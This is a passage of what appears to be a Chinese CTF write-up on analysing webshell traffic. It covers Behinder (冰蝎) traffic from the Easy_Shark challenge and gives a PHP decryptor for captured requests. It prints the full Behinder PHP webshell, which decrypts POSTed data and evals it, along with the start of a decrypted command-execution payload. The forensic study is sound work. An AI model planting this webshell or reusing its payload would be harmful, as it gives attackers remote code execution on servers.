class="line">encrypt_data_length=encrypt_data[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">encrypt_data_length=<span class="built_in">int</span>.from_bytes(encrypt_data_length, byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">encrypt_data_l = encrypt_data[<span class="number">4</span>:<span class="built_in">len</span>(encrypt_data)]</span><br><span class="line"></span><br><span class="line">data1=encrypt_data_l[<span class="number">0</span>:encrypt_data_length-<span class="number">16</span>]</span><br><span class="line">signature=encrypt_data_l[encrypt_data_length-<span class="number">16</span>:encrypt_data_length]</span><br><span class="line">iv_bytes = <span class="built_in">bytes</span>(<span class="string">&quot;abcdefghijklmnop&quot;</span>,<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dec=decrypt(data1,iv_bytes,signature,SHARED_KEY,HMAC_KEY)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">counter = dec[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line">counter=<span class="built_in">int</span>.from_bytes(counter, byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;counter:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(counter))</span><br><span class="line"></span><br><span class="line">dec_length = dec[<span class="number">4</span>:<span class="number">8</span>]</span><br><span class="line">dec_length=<span class="built_in">int</span>.from_bytes(dec_length, byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;任务返回长度:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(dec_length))</span><br><span class="line"></span><br><span class="line">de_data= dec[<span class="number">8</span>:<span class="built_in">len</span>(dec)]</span><br><span class="line">Task_type=de_data[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line">Task_type=<span class="built_in">int</span>.from_bytes(Task_type, byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;任务输出类型:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(Task_type))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(de_data[<span class="number">4</span>:dec_length].decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>))    <span class="comment"># 第69行</span></span><br><span class="line"><span class="built_in">print</span>(hexdump.hexdump(dec))</span><br></pre></td></tr></table></figure>

<h1 id="冰蝎流量"><a href="#冰蝎流量" class="headerlink" title="冰蝎流量"></a>冰蝎流量</h1><p>流量特征</p>
<p>Easy_Shark<br><a href="https://github.com/nyyyddddn/ctf/blob/main/Sictf2023%20%23Round%202/misc/Easy_Shark.zip">https://github.com/nyyyddddn/ctf/blob/main/Sictf2023%20%23Round%202/misc/Easy_Shark.zip</a></p>
<p>追踪http 流 发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">    $key=&quot;2295d22e2d70888f&quot;;</span><br><span class="line">	$_SESSION[&#x27;k&#x27;]=$key;</span><br><span class="line">	$post=file_get_contents(&quot;php://input&quot;);</span><br><span class="line">	if(!extension_loaded(&#x27;openssl&#x27;))</span><br><span class="line">	&#123;</span><br><span class="line">		$t=&quot;base64_&quot;.&quot;decode&quot;;</span><br><span class="line">		$post=$t($post.&quot;&quot;);</span><br><span class="line">		</span><br><span class="line">		for($i=0;$i&lt;strlen($post);$i++) &#123;</span><br><span class="line">    			 $post[$i] = $post[$i]^$key[$i+1&amp;15]; </span><br><span class="line">    			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		$post=openssl_decrypt($post, &quot;AES128&quot;, $key);</span><br><span class="line">	&#125;</span><br><span class="line">    $arr=explode(&#x27;|&#x27;,$post);</span><br><span class="line">    $func=$arr[0];</span><br><span class="line">    $params=$arr[1];</span><br><span class="line">	class C&#123;public function __invoke($p) &#123;eval($p.&quot;&quot;);&#125;&#125;</span><br><span class="line">    @call_user_func(new C(),$params);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$key=&quot;2295d22e2d70888f&quot;;</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="title function_ invoke__">getopt</span>(<span class="string">&#x27;a:k:f:t:d:&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;进入php文件\n\n\n\n\n&quot;</span>;</span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$arr</span>[<span class="string">&#x27;k&#x27;</span>])?<span class="variable">$key</span>=<span class="variable">$arr</span>[<span class="string">&#x27;k&#x27;</span>]:<span class="variable">$key</span>=<span class="string">&#x27;e45e329feb5d925b&#x27;</span>;</span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$arr</span>[<span class="string">&#x27;t&#x27;</span>])?<span class="variable">$http_type</span>=<span class="variable">$arr</span>[<span class="string">&#x27;t&#x27;</span>]:<span class="variable">$http_type</span>=<span class="string">&#x27;requests&#x27;</span>;</span><br><span class="line"><span class="comment">// echo &quot;this is \$key:&quot;.$key.&quot;\n this is \$http_type:&quot;.$http_type;</span></span><br><span class="line"><span class="comment">// echo &quot;\$post is :&quot;.$post.&quot;\n\n&quot;;</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$arr</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$arr</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="variable">$post_raw</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$arr</span>[<span class="string">&#x27;d&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$arr</span>[<span class="string">&#x27;d&#x27;</span>] = <span class="string">&#x27;t&#x27;</span>;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$arr</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$post_raw</span>= <span class="variable">$arr</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes_convert_str</span>(<span class="params"><span class="variable">$post_raw</span>,<span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// preg_match(&#x27;//&#x27;);</span></span><br><span class="line">    <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z0-9\+\=\/]&#123;24,&#125;/i&#x27;</span>,<span class="variable">$post_raw</span>,<span class="variable">$post</span>);</span><br><span class="line">    <span class="comment">// echo &quot;\$post is :&quot;.$post[0];</span></span><br><span class="line">    <span class="comment">// echo &quot;aes的数据为：&quot;;</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$post</span>) === <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// echo &quot;进入intoaes函数：&quot;.$post[0];</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$post</span>) === <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable">$post</span>=<span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$post</span>[<span class="number">0</span>], <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (\<span class="built_in">Throwable</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="comment">//日志方法，具体自己实现</span></span><br><span class="line">        <span class="comment">// CoreHelper::write(json_encode([&#x27;eventName&#x27;,&#x27;order_id&#x27;=&gt;$order-&gt;order_id??&#x27;&#x27;,$e-&gt;getMessage()], JSON_UNESCAPED_UNICODE)); </span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// var_dump($post);</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$post</span> == <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$post</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xor_convert_str</span>(<span class="params"><span class="variable">$post_raw</span>,<span class="variable">$key</span>,<span class="variable">$http_type</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// echo &quot;进入intoxor函数1,raw_data is :&quot;.$post_raw.&quot;xixixi\n\n\n\n\n\n\n&quot;;</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$http_type</span> == <span class="string">&#x27;requests&#x27;</span>)&#123;</span><br><span class="line">        <span class="comment">// echo &quot;this is :&quot;.$http_type.&quot;\n&quot;;</span></span><br><span class="line">		<span class="variable">$t</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line">        <span class="variable">$post</span>=<span class="variable">$t</span>(<span class="variable">$post_raw</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="variable">$post_raw</span> = <span class="variable">$post</span>;</span><br><span class="line">        <span class="comment">// echo &quot;this is \033[[95mrequests\033[[1m&quot;;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// echo &quot;thisresponse&quot;;</span></span><br><span class="line">        <span class="variable">$post</span> = <span class="variable">$post_raw</span>;</span><br><span class="line">        <span class="variable">$pattern</span> = <span class="string">&#x27;&lt;b&gt;Warning&lt;/b&gt;:  session_start(): Cannot send session cache limiter - headers already sent in &lt;b&gt;D:\phpstudy_pro\WWW\sqli-labs\shell.php&lt;/b&gt; on line &lt;b&gt;3&lt;/b&gt;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">        <span class="comment">// $pattern = &#x27;on line &lt;b&gt;3&lt;/b&gt;&lt;br /&gt;&#x27;;</span></span><br><span class="line">        <span class="comment">// echo &quot;hereis\$post&quot;.$post.&quot;\n\n\n\n&quot;;</span></span><br><span class="line">        <span class="comment">// var_dump(strpos($post,$pattern));</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$post</span>,<span class="variable">$pattern</span>) != <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$result</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$post</span>,<span class="title function_ invoke__">strpos</span>(<span class="variable">$post</span>,<span class="variable">$pattern</span>)+<span class="title function_ invoke__">strlen</span>(<span class="variable">$pattern</span>)+<span class="number">1</span>);</span><br><span class="line">            <span class="comment">// echo &quot;thatshouldberesult&quot;.$result.&quot;tty&quot;;</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$result</span> != <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">                <span class="variable">$post</span> = <span class="variable">$result</span>;</span><br><span class="line">                <span class="comment">// echo &quot;intotheconvert&quot;;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$post</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">    			 <span class="variable">$post</span>[<span class="variable">$i</span>] = <span class="variable">$post</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">                &#125;</span><br><span class="line">    <span class="comment">// echo &quot;进入intoxor函数2&quot;.$post.&quot;xixixi&quot;;</span></span><br><span class="line">    <span class="comment">// echo &quot;this is \$post:&quot;.$post;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$post</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$post</span> = <span class="title function_ invoke__">aes_convert_str</span>(<span class="variable">$post_raw</span>,<span class="variable">$key</span>);</span><br><span class="line"><span class="comment">// echo &quot;aes函数complate&quot;.$post.&quot;\n&quot;;</span></span><br><span class="line"><span class="variable">$post</span> === <span class="string">&#x27;no&#x27;</span>?<span class="variable">$post</span> = <span class="title function_ invoke__">xor_convert_str</span>(<span class="variable">$post_raw</span>,<span class="variable">$key</span>,<span class="variable">$http_type</span>):<span class="variable">$post</span>;</span><br><span class="line"><span class="comment">// echo &quot;this is \$post&quot;.$post;</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\&#123;/i&#x27;</span>,<span class="variable">$post</span>))&#123;</span><br><span class="line">    <span class="comment">// echo $post;</span></span><br><span class="line">    <span class="comment">// exit();</span></span><br><span class="line">    <span class="comment">// echo &quot;error is &quot;.$post;</span></span><br><span class="line">    <span class="variable">$raw_data</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$post</span>);</span><br><span class="line">    <span class="variable">$result</span> = [];</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$raw_data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">            <span class="variable">$result</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$value</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 捕获异常</span></span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Message: &#x27;</span> .<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$arr_2</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$post</span>);</span><br><span class="line"><span class="variable">$func</span> = <span class="variable">$arr_2</span>[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$arr_2</span>[<span class="number">1</span>])?<span class="variable">$parm</span>=<span class="variable">$arr_2</span>[<span class="number">1</span>]:<span class="variable">$parm</span>=<span class="variable">$func</span>;      <span class="comment"># 解决tcp请求包截取不完整导致aes解密后没有</span></span><br><span class="line"><span class="comment">// print(&quot;intotheexplode:&quot;.$parm);</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$parm</span> === <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$parm</span>=<span class="string">&#x27;Y29udGVudCBpcyBlbXB0eQ==&#x27;</span>;       <span class="comment"># 解决 http截取的tcp包不完整的情况</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z0-9\+\=\/]&#123;24,&#125;/i&#x27;</span>,<span class="variable">$parm</span>,<span class="variable">$last_result</span>);</span><br><span class="line"><span class="comment">// echo &quot;匹配到的内容为&quot;.$result[0];</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$last_result</span>) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$last_result</span>[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$parm</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php decropt.php -a 后面接要解密的字符串</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php decropt.php -f 解密的字符串的文件</span><br></pre></td></tr></table></figure>

<blockquote>
<p>此处的密文字符串文件只允许存在密文，不允许有http请求体。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php decropt.php -k 秘钥 -a 解密字符串</span><br></pre></td></tr></table></figure>

<blockquote>
<p>默认的key值为冰蝎默认密码。</p>
</blockquote>
<p>tcp 流5</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php decropt.php -k 2295d22e2d70888f -a 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</span><br></pre></td></tr></table></figure>



<p>解密后</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@error_reporting(0);</span><br><span class="line"></span><br><span class="line">function getSafeStr($str)&#123;</span><br><span class="line">    $s1 = iconv(&#x27;utf-8&#x27;,&#x27;gbk//IGNORE&#x27;,$str);</span><br><span class="line">    $s0 = iconv(&#x27;gbk&#x27;,&#x27;utf-8//IGNORE&#x27;,$s1);</span><br><span class="line">    if($s0 == $str)&#123;</span><br><span class="line">        return $s0;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return iconv(&#x27;gbk&#x27;,&#x27;utf-8//IGNORE&#x27;,$str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function main($cmd)</span><br><span class="line">&#123;</span><br><span class="line">    @set_time_limit(0);</span><br><span class="line">    @ignore_user_abort(1);</span><br><span class="line">    @ini_set(&#x27;max_execution_time&#x27;, 0);</span><br><span class="line">    $result = array();</span><br><span class="line">    $PadtJn = @ini_get(&#x27;disable_functions&#x27;);</span><br><span class="line">    if (! empty($PadtJn)) &#123;</span><br><span class="line">        $PadtJn = preg_replace(&#x27;/[, ]+/&#x27;, &#x27;,&#x27;, $PadtJn);</span><br><span class="line">        $PadtJn = explode(&#x27;,&#x27;, $PadtJn);</span><br><span class="line">        $PadtJn = array_map(&#x27;trim&#x27;, $PadtJn);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $PadtJn = array();</span><br><span class="line">    &#125;</span><br><span class="line">    